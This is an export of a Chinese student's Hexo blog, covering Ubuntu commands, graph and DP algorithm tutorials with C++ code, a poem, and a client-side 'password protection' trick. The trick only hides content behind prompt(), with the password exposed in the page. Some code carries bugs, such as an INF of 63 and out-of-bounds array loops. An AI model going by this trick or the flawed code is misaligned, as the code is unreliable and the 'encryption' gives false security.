icon-file-text&apos;&gt;File three .selected!&lt;/span&gt; &lt;/li&gt; &lt;/ul&gt; &lt;/li&gt; &lt;li class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-text&apos;&gt;.icon-file-text&lt;/span&gt; &lt;/li&gt; &lt;li class=&apos;list-item&apos;&gt; &lt;span class=&apos;icon icon-file-symlink-file&apos;&gt;.icon-file-symlink-file&lt;/span&gt; &lt;/li&gt;&lt;/ul&gt;]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>html</tag>
        <tag>markdown</tag>
        <tag>blog</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu终端基础命令(二)]]></title>
    <url>%2Farticles%2Fterminal2%2F</url>
    <content type="text"><![CDATA[本文是Ubuntu终端基础命令(一)的续集新建文件/文件夹新建文件/文件夹命令$ touch [name]我们运行命令： $ touch 1.cpp效果：注意，我们输入的\是要带后缀的。当然，你的这个后缀是什么都可以的创建目录(文件夹):$ mkdir [name]比方说，我们要新建一个叫做1的目录(文件夹)，就可以运行命令：$ mkdir 1注意：这是在普通文件夹的创建，在系统文件夹中要先取得权限权限问题取得权限有两种方法：执行 su 命令进入root帐户使用 sudo 暂时取得权限su进入root用户：$ susudo使用sudo命令可以短暂取得权限$ sudo &lt;命令&gt;在命令前加 &#39;sudo&#39;输入密码，即可在Ubuntu中，我们可以在网上下载到各个软件的.deb包，接下来，我们就来看一看如何解包.deb包首先，cd到相应目录运行解包命令：$ sudo dpkg --install xxx.deb注意，上方的xxx.deb输入的时候，可以按&#39;Tab&#39;键补全。(未完待续)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>system</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu终端基础命令(一)]]></title>
    <url>%2Farticles%2Fterminal%2F</url>
    <content type="text"><![CDATA[大家都知道，Terminal是Linux下十分有用的东西，下面Shq就介绍下Teminal一些常用的命令打开文件在终端中打开文件夹。$ cd [文件名]cd到目录返回上一个目录$ cd ..打开文件夹清屏清屏命令$ clear比如我们有一个十分乱的终端233333333但是，我们有Shq的教程在，发动秘技-------反复横跳，使用clear秘技就会变得异常干净明了退出终端下面就介绍一下如何退出终端（据Wyhdalao说，直接点X号是会损坏机子的如果你够有钱，你可以不看，所以说我们就需要一个十分有效的方法去不损坏电脑关掉终端$ exit问题来了，有时候一次关闭会关不掉所以说，我们要模仿关酒精灯的方法(雾)，再关一次233未完待续]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>system</tag>
        <tag>terminal</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[安装elementaryos虚拟机]]></title>
    <url>%2Farticles%2Felementaryos%2F</url>
    <content type="text"><![CDATA[elementaryoselementaryos 官网Elementary OS 系统它是一款基于 Ubuntu 精心打磨美化的桌面 Linux 发行版，号称 “最美的 Linux”。 Elementary 最早是 Ubuntu 的一个美化主题项目，后来太受欢迎演变成了独立的发行版。Elementary OS 由设计师主导开发，风格与 macOS 有点相似，它借鉴了 ChromeOS 的菜单设计，系统核心依然是 Ubuntu，可以「完全兼容所有 Ubuntu 软件包」。elementary OS 从界面外观到系统的各种设计元素都很精美，逼格甚高！如果你想体验下 Linux 与漂亮的界面设计，那么可以装来玩玩……于是， Shq就带着不怕死折腾的精神，用Vbox装了个 elementaryos的虚拟机续你机完成安装图片：锁屏界面：Terminal图片:另附上我的Vbox图片：安装略(自己Google百度一下就行了(逃教程链接配置首先，原装系统的包含的软件有：Midori浏览器DockyGeary MailLingo 字典Abiword文字处理器Software Centre 软件中心ShotwellTotem 视频播放器noise音乐播放器EmpathyNautilus-Elementaryscartch当然，这些软件还是不错的，但是既然我们要美化及配置，就要卸载预装软件。卸载软件的命令：$ sudo apt-get remove \其中 \是指软件名称这也不仅可以卸载预装软件，也可以卸载其他软件。By - Shq(未完待续)]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>system</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[故人不复]]></title>
    <url>%2Farticles%2Fpoem1%2F</url>
    <content type="text"><![CDATA[故人不复--shq浮萍彷徨，清流冷淌。还余旧年，月色潇湘。 忆浊茶醉，夜宿雕梁，追忆此情，哪辨鸳鸯。 擦肩邂逅，尽生难忘。执伞同行，烟雨茫茫。 转瞬之间，即成过往。既不回头，何必不忘。 西风微凉，红笺玉蔷。秋水未央，霜满松堂。 寻觅玖廊，芙蓉微凉，故人不复，寸裂柔肠。]]></content>
      <categories>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>诗</tag>
        <tag>感悟</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[动态规划算法（一）]]></title>
    <url>%2Farticles%2Fdynamic-planning%2F</url>
    <content type="text"><![CDATA[动态规划是解决问题的一种十分常用的方法算法描述动态规划过程是：每次决策依赖于当前状态，又随即引起状态的转移。一个决策序列就是在变化的状态中产生出来的，所以，这种多阶段最优化决策解决问题的过程就称为动态规划。基本思想 &amp;&amp; 策略基本思想与分治法类似，也是将待求解的问题分解为若干个子问题（阶段），按顺序求解子阶段，前一子问题的解，为后一子问题的求解提供了有用的信息。在求解任一子问题时，列出各种可能的局部解，通过决策保留那些有可能达到最优的局部解，丢弃其他局部解。依次解决各子问题，最后一个子问题就是初始问题的解。由于动态规划解决的问题多数有重叠子问题这个特点，为减少重复计算，对每一个子问题只解一次，将其不同阶段的不同状态保存在一个二维数组中。与分治法最大的差别是：适合于用动态规划法求解的问题，经分解后得到的子问题往往不是互相独立的（即下一个子阶段的求解是建立在上一个子阶段的解的基础上，进行进一步的求解）。适用的情况能采用动态规划求解的问题的一般要具有3个性质：最优化原理：如果问题的最优解所包含的子问题的解也是最优的，就称该问题具有最优子结构，即满足最优化原理。无后效性：即某阶段状态一旦确定，就不受这个状态以后决策的影响。也就是说，某状态以后的过程不会影响以前的状态，只与当前状态有关。有重叠子问题：即子问题之间是不独立的，一个子问题在下一阶段决策中可能被多次使用到。（该性质并不是动态规划适用的必要条件，但是如果没有这条性质，动态规划算法同其他算法相比就不具备优势）求解的基本步骤动态规划所处理的问题是一个多阶段决策问题，一般由初始状态开始，通过对中间阶段决策的选择，达到结束状态。这些决策形成了一个决策序列，同时确定了完成整个过程的一条活动路线(通常是求最优的活动路线)。如图所示。动态规划的设计都有着一定的模式，一般要经历以下几个步骤。初始状态→│决策１│→│决策２│→…→│决策ｎ│→结束状态(1)划分阶段：按照问题的时间或空间特征，把问题分为若干个阶段。在划分阶段时，注意划分后的阶段一定要是有序的或者是可排序的，否则问题就无法求解。(2)确定状态和状态变量：将问题发展到各个阶段时所处于的各种客观情况用不同的状态表示出来。当然，状态的选择要满足无后效性。(3)确定决策并写出状态转移方程：因为决策和状态转移有着天然的联系，状态转移就是根据上一阶段的状态和决策来导出本阶段的状态。所以如果确定了决策，状态转移方程也就可写出。但事实上常常是反过来做，根据相邻两个阶段的状态之间的关系来确定决策方法和状态转移方程。(4)寻找边界条件：给出的状态转移方程是一个递推式，需要一个递推的终止条件或边界条件。一般，只要解决问题的阶段、状态和状态转移决策确定了，就可以写出状态转移方程（包括边界条件）。实际应用中可以按以下几个简化的步骤进行设计：分析最优解的性质，并刻画其结构特征。递归的定义最优解。以自底向上或自顶向下的记忆化方式（备忘录法）计算出最优值根据计算最优值时得到的信息，构造问题的最优解算法实现的说明动态规划的主要难点在于理论上的设计，也就是上面4个步骤的确定，一旦设计完成，实现部分就会非常简单。使用动态规划求解问题，最重要的就是确定动态规划三要素：问题的阶段每个阶段的状态从前一个阶段转化到后一个阶段之间的递推关系。递推关系必须是从次小的问题开始到较大的问题之间的转化，从这个角度来说，动态规划往往可以用递归程序来实现，不过因为递推可以充分利用前面保存的子问题的解来减少重复计算，所以对于大规模问题来说，有递归不可比拟的优势，这也是动态规划算法的核心之处。确定了动态规划的这三要素，整个求解过程就可以用一个最优决策表来描述，最优决策表是一个二维表，其中行表示决策的阶段，列表示问题状态，表格需要填写的数据一般对应此问题的在某个阶段某个状态下的最优值（如最短路径，最长公共子序列，最大价值等），填表的过程就是根据递推关系，从1行1列开始，以行或者列优先的顺序，依次填写表格，最后根据整个表格的数据通过简单的取舍或者运算求得问题的最优解。f(n,m)=max{f(n-1,m),f(n-1,m-w[n])+P(n,m)}基本框架123456789101112// 嵌套矩形题目// 本题状态转移方程：// d(i) = max &#123; d(j) + 1|(i, j) 属于 E &#125;;int dp(int i) &#123; int&amp; ans = d[i]; if (ans &gt; 0) return ans; ans = 1; for (int j = 1; j &lt;= n; j++) if (G[i][j]) ans = max(ans, dp(j + 1)); return ans;&#125;课后习题大家可以敲一下luogu P1002的题By - Shq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dijkstra算法]]></title>
    <url>%2Farticles%2Fdijkstra%2F</url>
    <content type="text"><![CDATA[Dijkstra算法是求最短路径的一种十分好用的方法算法描述Dijkstra算法是典型的单源最短路径算法,用于计算一个节点到其他所有节点的最短路径,主要特点是以起点为中心向外层扩展,直到扩展到终点为止.该算法要求图中不存在负权边.算法思想设G=(V,E)是一个带权的有向图, 把图中顶点集合分为两组,第一组为已求出最短路径的顶点集合(用S表示,初始时S中只有一个源点，以后每求得一条最短路径，就将加入到集合S中,直到全部顶点都加到S中,算法就结束了),第二组为其余未确定最短路径的顶点集合(用U表示),按照最短路径长度的递增次序依次把第二组的顶点加入到S中，在加入过程中,总保持从源点v到S中各顶点的最短路径长度不大于从源点v到U中任何顶点的最短路径长度, 此外,每个顶点对应一个距离，S中的顶点的距离就是从v到此顶点的最短路径长度,U中的顶点的距离,是从v到此顶点只包含S中的顶点为中间顶点的当前最短路径长度.代码完整代码：https://github.com/liuhangyang/Data_Structure_and_Algorithm/blob/master/%E7%AC%AC%E4%B8%83%E7%AB%A0/linjiebiao.c123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990AdjList *Created_Graph(AdjList *G)&#123; int i,j,k,n1,n2,weight; ArcNode *s; char vex1,vex2; G=(AdjList *)malloc(sizeof(AdjList)); printf("请输入顶点的个数和边数:"); scanf("%d%d",&amp;G-&gt;vexnum,&amp;G-&gt;arcnum); printf("请输入顶点:\n"); for(i=1;i&lt;=G-&gt;vexnum;i++) &#123; printf("No.%d号顶点的值:",i); scanf(" %c",&amp;G-&gt;vertex[i].vexdata); G-&gt;vertex[i].head=(ArcNode *)malloc(sizeof(ArcNode)); //为每个头节点开辟空间;有头节点的链表; G-&gt;vertex[i].head-&gt;next=NULL; //头节点指向为空; &#125; printf("请输入由两个顶点构成的边:\n"); for(k=1;k&lt;=G-&gt;arcnum;k++)&#123; printf("请输入第%d条边:",k); scanf(" %c%c",&amp;vex1,&amp;vex2); for(i=1;i&lt;=G-&gt;vexnum;i++)&#123; if(G-&gt;vertex[i].vexdata == vex1)&#123; n1=i; &#125; if(G-&gt;vertex[i].vexdata == vex2)&#123; n2=i; &#125; &#125; printf("请输入权值:"); scanf("%d",&amp;weight); s=(ArcNode *)malloc(sizeof(ArcNode)); s-&gt;adjvex = n2; s-&gt;weight=weight; Insert(&amp;G-&gt;vertex[n1],s); /*如果是有向图，则下面的语句去掉就行*/ /*s=(ArcNode *)malloc(sizeof(ArcNode)); s-&gt;adjvex = n1; s-&gt;weight=weight; Insert(&amp;G-&gt;vertex[n2],s);*/ &#125; return G;&#125;void Dijkstra(AdjList *G,int start,int disk[],int path[][MAXVEX])&#123; int i,j,mindist,k,t; ArcNode *p; for(i=1;i&lt;=G-&gt;vexnum;i++)&#123; //初始化最短路径数组disk,和标记此顶点是否已经找到最短路径的path[i][0],等于0表示没有找到,等于1表示找到. disk[i]=INFINE; path[i][0]=0; &#125; p=G-&gt;vertex[start].head-&gt;next; while(p)&#123; //保存源点到和此源点相关的顶点的路径. disk[p-&gt;adjvex]=p-&gt;weight; path[p-&gt;adjvex][1]=start; path[p-&gt;adjvex][2]=p-&gt;adjvex; path[p-&gt;adjvex][3]=0; p=p-&gt;next; &#125; path[start][0]=1; //源点标记为为1，其最短路径为0.此顶点以后不会再用到 for(i=2;i&lt;=G-&gt;vexnum;i++)&#123; //选择最最短的路径 mindist=INFINE; for(j=1;j&lt;=G-&gt;vexnum;j++)&#123; if(!path[j][0] &amp;&amp; disk[j] &lt; mindist)&#123; k=j; mindist=disk[j]; &#125; &#125; if(mindist == INFINE)&#123; //如果没有找到最短的路径，则说明从此源点不能到任何其他顶点，直接返回. return; &#125; path[k][0]=1; //标记找到最小路径的顶点，此顶点以后不会再用到. p=G-&gt;vertex[k].head-&gt;next; while(p)&#123; if(!path[p-&gt;adjvex][0]&amp;&amp; disk[p-&gt;adjvex] &gt; disk[k]+ p-&gt;weight)&#123; //更新disk，使其从保持从源点到和此顶点相关的顶点的路径最短. //printf("p-&gt;ad:%d ",p-&gt;adjvex); disk[p-&gt;adjvex]=disk[k]+p-&gt;weight; t=1; while(path[k][t]!=0) //记录最新的路径 &#123; path[p-&gt;adjvex][t]=path[k][t]; t++; &#125; path[p-&gt;adjvex][t]=p-&gt;adjvex; path[p-&gt;adjvex][t+1]=0; //path[i][t+1]之前的都是最短路径所要经过的顶点，从t+1这里停止,作为最后输出路径的判断条件 &#125; p=p-&gt;next; &#125; &#125;&#125;但是，明显指针的方法太毒瘤了，不如我们换种方法：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &lt;iostream&gt;using namespace std;const int maxnum = 100;const int maxint = 999999;void Dijkstra(int n, int v, int *dist, int *prev, int c[maxnum][maxnum])&#123; bool s[maxnum]; // 判断是否已存入该点到S集合中 for(int i=1; i&lt;=n; ++i) &#123; dist[i] = c[v][i]; s[i] = 0; // 初始都未用过该点 if(dist[i] == maxint) prev[i] = 0; else prev[i] = v; &#125; dist[v] = 0; s[v] = 1; // 依次将未放入S集合的结点中，取dist[]最小值的结点，放入结合S中 // 一旦S包含了所有V中顶点，dist就记录了从源点到所有其他顶点之间的最短路径长度 for(int i=2; i&lt;=n; ++i) &#123; int tmp = maxint; int u = v; // 找出当前未使用的点j的dist[j]最小值 for(int j=1; j&lt;=n; ++j) if((!s[j]) &amp;&amp; dist[j]&lt;tmp) &#123; u = j; // u保存当前邻接点中距离最小的点的号码 tmp = dist[j]; &#125; s[u] = 1; // 表示u点已存入S集合中 // 更新dist for(int j=1; j&lt;=n; ++j) if((!s[j]) &amp;&amp; c[u][j]&lt;maxint) &#123; int newdist = dist[u] + c[u][j]; if(newdist &lt; dist[j]) &#123; dist[j] = newdist; prev[j] = u; &#125; &#125; &#125;&#125;void searchPath(int *prev,int v, int u)&#123; int que[maxnum]; int tot = 1; que[tot] = u; tot++; int tmp = prev[u]; while(tmp != v) &#123; que[tot] = tmp; tot++; tmp = prev[tmp]; &#125; que[tot] = v; for(int i=tot; i&gt;=1; --i) if(i != 1) cout &lt;&lt; que[i] &lt;&lt; " -&gt; "; else cout &lt;&lt; que[i] &lt;&lt; endl;&#125;int main()&#123; freopen("input.txt", "r", stdin); // 各数组都从下标1开始 int dist[maxnum]; // 表示当前点到源点的最短路径长度 int prev[maxnum]; // 记录当前点的前一个结点 int c[maxnum][maxnum]; // 记录图的两点间路径长度 int n, line; // 图的结点数和路径数 // 输入结点数 cin &gt;&gt; n; // 输入路径数 cin &gt;&gt; line; int p, q, len; // 输入p, q两点及其路径长度 // 初始化c[][]为maxint for(int i=1; i&lt;=n; ++i) for(int j=1; j&lt;=n; ++j) c[i][j] = maxint; for(int i=1; i&lt;=line; ++i) &#123; cin &gt;&gt; p &gt;&gt; q &gt;&gt; len; if(len &lt; c[p][q]) // 有重边 &#123; c[p][q] = len; // p指向q c[q][p] = len; // q指向p，这样表示无向图 &#125; &#125; for(int i=1; i&lt;=n; ++i) dist[i] = maxint; for(int i=1; i&lt;=n; ++i) &#123; for(int j=1; j&lt;=n; ++j) printf("%8d", c[i][j]); printf("\n"); &#125; Dijkstra(n, 1, dist, prev, c); // 最短路径长度 cout &lt;&lt; "源点到最后一个顶点的最短路径长度: " &lt;&lt; dist[n] &lt;&lt; endl; // 路径 cout &lt;&lt; "源点到最后一个顶点的路径为: "; searchPath(prev, 1, n);&#125;到此，代码就结束了By - Shq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>dijkstra</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[「折腾向」文章实施加密措施]]></title>
    <url>%2Farticles%2Fuse-hexo2%2F</url>
    <content type="text"><![CDATA[即使是最简单的密码功能也足以阻止90%的访问者一、前言一开始使用Hexo的时候，是喜欢它的简单：因为可以直接编译成纯静态文件，方便部署。可是在使用过程中，又发现诸多不便：也因为它全是纯静态页面。突发奇想，能不能给文章加上一个加密访问的功能……在经过实践之后，运用到自己博客中，发现有不少的访客对这个功能甚是感兴趣，所以也就在这里找个时间写写自己加密的小诀窍吧算是。二、原理由于 Hexo 最终编译出来的文件是纯静态的，也就意味着文章的所有信息其实还是原封不动展示在页面中的，当你输入一篇文章的网址，所有的内容就已经跟随网络传输过来了。那我博客使用的加密是怎么实现的呢？这就要讲到 js 的阻塞机制了，在以往的经验中，当页面中有调用alert();函数的时候，整个页面会停止运行，直到你点击确定之后，页面的中的代码才会继续执行下去。我们这里需要的也是这样一个假象，阻止整个页面的渲染，直到你输入了正确的密码才能让页面继续渲染实际的文章。可是alert只有提醒的功能，没有输入的功能，所以这里要用到的是promt函数。例子参见如下：12var password = promt('请输入文章密码');alert(password);三、实践究竟要把上述代码加在哪里呢？ 找到themes-&gt;next-&gt;layout-&gt;_partials-&gt;head.swig文件。 按道理是添加在任何地方都行，但是推荐加在所有的&lt;meta&gt;标签之后，个人建议，仅做参考。以下是我加的代码：12345678910&lt;script&gt; (function()&#123; if(&apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; if (prompt(&apos;请输入文章密码&apos;,&apos;&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; alert(&apos;密码错误！&apos;); history.back(); &#125; &#125; &#125;)();&lt;/script&gt;如果你好奇page.password是什么东西，那么恭喜你，你对 Hexo 的结构还是很熟悉的。page这个变量就是你在hexo new的时候生成文件中最顶部的东西，以下我给出这篇文章的头部参考：1234567891011---title: Hexo文章简单加密访问date: 2016-12-01 10:45:29tags: hexocategories: 博客keywords: - Hexo - 加密description: 文章访问密码：passwordpassword: password---这样我们就好像使用静态页面完成了部分只有动态页面能完成的东西。四、总结本来只是简单的纯静态页面，但是经历不断的更新和改进，便有了静态页面统计访问量的工具；有了静态页面添加评论的工具；甚至有了静态页面进行搜索的功能等等。个人想出来的静态页面加密功能根本算不上技术上的创新，只能说是一点小技巧的应用吧，小技巧也能迷惑住大家的眼睛，也算是喜事一件。]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[prims详解]]></title>
    <url>%2Farticles%2Fprims%2F</url>
    <content type="text"><![CDATA[再上一篇最小生成树的文章中，我们介绍了Kruskal算法和Prim算法，但是由于时间仓促，没详细介绍了Prim算法，在这篇文章中，我们介绍一下Prim算法图解：设置2个数据结构：lowcost[i]lowcost[i]lowcost[i] :表示以i为终点的边的最小权值,当 lowcost[i]=0lowcost[i]=0lowcost[i]=0 说明以i为终点的边的最小权值 =0=0=0 ,也就是表示 iii 点加入了MSTmst[i]:mst[i]:mst[i]: 表示对应 lowcost[i]lowcost[i]lowcost[i] 的起点，即说明边 &lt;mst[i],i&gt;&lt;mst[i],i&gt;&lt;mst[i],i&gt; 是MST的一条边，当 mst[i]=0mst[i]=0mst[i]=0 表示起点i加入MST我们假设 V1V1V1 是起始点，进行初始化（*代表无限大，即无通路）：，，，，，，，，， （所有点默认起点是 V1V_1V​1​​ ）明显看出，以 V3V3V3 为终点的边的权值最小 =1=1=1 ，所以边 &lt;mst[3],3&gt;=1&lt;mst[3],3&gt;=1&lt;mst[3],3&gt;=1 加入MST此时，因为点V3的加入，需要更新lowcost数组和mst数组：，，，，，，，，明显看出，以 V6V6V6 为终点的边的权值最小 =4=4=4 ，所以边 &lt;mst[6],6&gt;=4&lt;mst[6],6&gt;=4&lt;mst[6],6&gt;=4 加入MST此时，因为点 V6V6V6 的加入，需要更新 lowcostlowcostlowcost 数组和 mstmstmst 数组：，，，，，，，，明显看出，以V4为终点的边的权值最小=2，所以边 &lt;mst[4],4&gt;=4&lt;mst[4],4&gt;=4&lt;mst[4],4&gt;=4 加入MST此时，因为点 V4V4V4 的加入，需要更新 lowcostlowcostlowcost 数组和 mstmstmst 数组：，，，，，，，，明显看出，以V2为终点的边的权值最小=5，所以边\=5加入MST此时，因为点 的加入，需要更新 数组和 数组：，，，，，，，，很明显，以 V5V5V5 为终点的边的权值最小=3，所以边 &lt;mst[5],5&gt;=3&lt;mst[5],5&gt;=3&lt;mst[5],5&gt;=3 加入MST，，，，，，，，至此，MST构建成功，如图所示：By - Shq]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[最小生成树]]></title>
    <url>%2Farticles%2FMinimum-spanning-tree%2F</url>
    <content type="text"><![CDATA[Kruskal算法kruskal算法适用于求稀疏图的最小生成树。它是通过遍历边来求出最小生成树的。tips> 时间复杂度:O(elog_e)(e为边数)算法的实现因为要求最小生成树，所以对于我们找出的最小生成树来说，边权越小自然越好，所以我们第一步就要以边权为关键字对所有边进行升序排序。tips> 这也是为什么时间复杂度是O(elog_e)的原因tips> 所以我们在这里不推荐使用连接表储存边，反而直接用结构体把关键讯息存下来即可接下来，从最小边开始遍历，依次用并查集处理边。对于一条新遍历到的边(假设是u,v 两点相连的边，权值为w )来说，如果u,v, 不在同一并查集中，说明这是一条新边，把它的权值w 加入我们的答案中，并且将v 点合并到u 点的并查集中。tips> 在这一步之前，千万不要忘记将并查集初始化！因为最小生成树的定义特点，当选中n-1条边时，最小生成树就形成了，所以我们在遍历中特判一下，即时退出循环就可以了。tips> 这一步可以用一个变量(如cnt之类的)存选中边数，这个操作每次和答案更新同时进行。tips> 如果遍历完所有边都没有选到n-1条，那么这张图自然无法形成最小生成树其他奇怪的事情Q:问我啥时候不能形成最小生成树？A:那么如果只有一个点的时候(连边都没有)也是一张图，但没有最小生成树。虽然例子极端，我觉得吼啊！Q:为什么是n-1条边？A:这是最小生成树的定义，自己去网上搜索一下吧或者自己想一想就出来喽。Q:无向图需要开两倍边吗？A:因为我们用并查集处理，只考虑边联通的两点之间是否在一个并查集，只要其中有一点不在并查集中，自然就是我们要找的新边。算法模拟不模拟，太麻烦。题解P3366 【模板】最小生成树这是一道裸最小生成树的题，可以直接上代码123456789101112131415161718192021222324252627282930313233343536373839404142#include&lt;iostream&gt;#include&lt;cstdio&gt;#include&lt;cstring&gt;#include&lt;algorithm&gt;#define ll long longusing namespace std;struct edge&#123; ll u,v,w;&#125;e[200000+10];bool cmp(const edge &amp;a,const edge &amp;b)&#123; return a.w&lt;b.w;&#125;ll f[200000+10],n,m,ans,cnt;ll find(ll x)&#123; if(f[x]!=x) f[x]=find(f[x]); return f[x];&#125;//并查集的核心代码void kruskal()&#123; sort(e,e+m,cmp); for(int i=0;i&lt;m;i++)&#123; ll u=e[i].u, v=e[i].v, w=e[i].w; ll fu=find(u), fv=find(v); if(fu==fv) continue; ans+=w; f[fv]=fu; cnt++; if(cnt==n-1) break; &#125;&#125;int main()&#123; scanf("%d %d",&amp;n,&amp;m); for(int i=1;i&lt;=n;i++) f[i]=i; //并查集初始化 for(int i=0;i&lt;m;i++)&#123; scanf("%lld %lld %lld",&amp;e[i].u,&amp;e[i].v,&amp;e[i].w); &#125; //我们只储存边的讯息即可，不用连接表 kruskal(); if(cnt!=n-1) printf("orz"); printf("%lld",ans); return 0;&#125;下面介绍一下另一种算法--Prims算法Prims算法Prim算法是从点的方面考虑构建一颗MST，大致思想是：设图G顶点集合为U，首先任意选择图G中的一点作为起始点a，将该点加入集合V，再从集合U-V中找到另一点b使得点b到V中任意一点的权值最小，此时将b点也加入集合V；以此类推，现在的集合V={a，b}，再从集合U-V中找到另一点c使得点c到V中任意一点的权值最小，此时将c点加入集合V，直至所有顶点全部被加入V，此时就构建出了一颗MST。因为有N个顶点，所以该MST就有N-1条边，每一次向集合V中加入一个点，就意味着找到一条MST的边。代码123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;using namespace std;const int M=5001,INF=999999999;int n,e1,e;int w[M][M];int minc[M];void solve(int s)&#123; int i,j,count=0,min,k; for(i=1;i&lt;=n;i++)minc[i]=w[s][i]; minc[s]=0; for(i=1;i&lt;n;i++)&#123; min=INF; for(j=1;j&lt;=n;j++)&#123; if(minc[j] &amp;&amp; minc[j]&lt;min)&#123; min=minc[j]; k=j; &#125; &#125; minc[k]=0; count+=min; for(j=1;j&lt;=n;j++)&#123; if(w[k][j]&lt;minc[j]) minc[j]=w[k][j]; &#125; &#125; printf("%d\n",count);&#125;int main()&#123; freopen("mst.in","r",stdin); int t1,t2,t3; for(int i=0;i&lt;=M;i++) for(int j=0;j&lt;=M;j++)w[i][j]=INF; scanf("%d%d",&amp;n,&amp;e); for(int i=1;i&lt;=e;i++)&#123; scanf("%d%d",&amp;t1,&amp;t2);scanf("%d",&amp;t3); if(t3&lt;w[t1][t2])w[t2][t1]=w[t1][t2]=t3; &#125; solve(n&gt;&gt;1); return 0;&#125;具体关于prim的一些内容，请看我写的另一篇Blog\[prim详解](https://blog-shq.github.io/2017/12/30/prims/)\.from: Luogu]]></content>
      <categories>
        <category>OI</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
        <tag>最小生成树</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[[USACO09OCT]Heat Wave热浪]]></title>
    <url>%2Farticles%2FHeatWave%2F</url>
    <content type="text"><![CDATA[这是一道经典的dijkstra的题题目描述The good folks in Texas are having a heatwave this summer. Their Texas Longhorn cows make for good eating but are not so adept at creating creamy delicious dairy products. Farmer John is leading the charge to deliver plenty of ice cold nutritious milk to Texas so the Texans will not suffer the heat too much.FJ has studied the routes that can be used to move milk from Wisconsin to Texas. These routes have a total of T (1 &lt;= T &lt;= 2,500) towns conveniently numbered 1..T along the way (including the starting and ending towns). Each town (except the source and destination towns) is connected to at least two other towns by bidirectional roads that have some cost of traversal (owing to gasoline consumption, tolls, etc.). Consider this map of seven towns; town 5 is thesource of the milk and town 4 is its destination (bracketed integers represent costs to traverse the route):123456789 [1]----1---[3]- / \ [3]---6---[4]---3--[3]--4 / / /|5 --[3]-- --[2]- | \ / / | [5]---7---[2]--2---[3]--- | / [1]------Traversing 5-6-3-4 requires spending 3 (5-&gt;6) + 4 (6-&gt;3) + 3 (3-&gt;4) = 10 total expenses.Given a map of all the C (1 &lt;= C &lt;= 6,200) connections (described as two endpoints R1i and R2i (1 &lt;= R1i &lt;= T; 1 &lt;= R2i &lt;= T) and costs (1 &lt;= Ci &lt;= 1,000), find the smallest total expense to traverse from the starting town Ts (1 &lt;= Ts &lt;= T) to the destination town Te (1 &lt;= Te &lt;= T). 德克萨斯纯朴的民眾们这个夏天正在遭受巨大的热浪！！！他们的德克萨斯长角牛吃起来不错，可是他们并不是很擅长生產富含奶油的乳製品。Farmer John此时以先天下之忧而忧，后天下之乐而乐的精神，身先士卒地承担起向德克萨斯运送大量的营养冰凉的牛奶的重任，以减轻德克萨斯人忍受酷暑的痛苦。FJ已经研究过可以把牛奶从威斯康星运送到德克萨斯州的路线。这些路线包括起始点和终点先一共经过T (1 &lt;= T &lt;= 2,500)个城镇，方便地标号為1到T。除了起点和终点外地每个城镇由两条双向道路连向至少两个其它地城镇。每条道路有一个通过费用（包括油费，过路费等等）。给定一个地图，包含C (1 &lt;= C &lt;= 6,200)条直接连接2个城镇的道路。每条道路由道路的起点Rs，终点Re (1 &lt;= Rs &lt;= T; 1 &lt;= Re &lt;= T)，和花费(1 &lt;= Ci &lt;= 1,000)组成。求从起始的城镇Ts (1 &lt;= Ts &lt;= T)到终点的城镇Te(1 &lt;= Te &lt;= T)最小的总费用。输入输出格式输入格式：第一行: 4个由空格隔开的整数: T, C, Ts, Te 第2到第C+1行: 第i+1行描述第i条道路。有3个由空格隔开的整数: Rs, Re和Ci输出格式：一个单独的整数表示从Ts到Te的最小总费用。数据保证至少存在一条道路。输入输出样例输入样例：1234567891011127 11 5 42 4 21 4 37 2 23 4 35 7 57 3 36 1 16 3 42 4 35 6 37 2 1输出样例：17代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;iostream&gt;#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;algorithm&gt;#include &lt;cstdlib&gt;#define LL long long// #define LOCKusing namespace std;const int MAXN = 2600;const int INF = (1 &lt;&lt; 6) - 1;int a[MAXN][MAXN];int d[MAXN];bool f[MAXN];int t, c, S, T;inline void dijkstra(int st)&#123; for (int i = 1; i &lt;= t; i++) d[i]=a[st][i]; f[st] = true;d[st] = 0; for (static int i = 1; i &lt;= t; i++) &#123; int minn=INF,k=0; for (int j = 1; j &lt;= t; j++) if ((!f[j]) &amp;&amp; (d[j] &lt; minn)) &#123;minn = d[j];k = j;&#125; if (k == 0) return; f[k] = true; for (int j = 1; j &lt;= t; j++) if ((!f[j]) &amp;&amp; (d[k] + a[k][j] &lt; d[j])) d[j] = d[k] + a[k][j]; 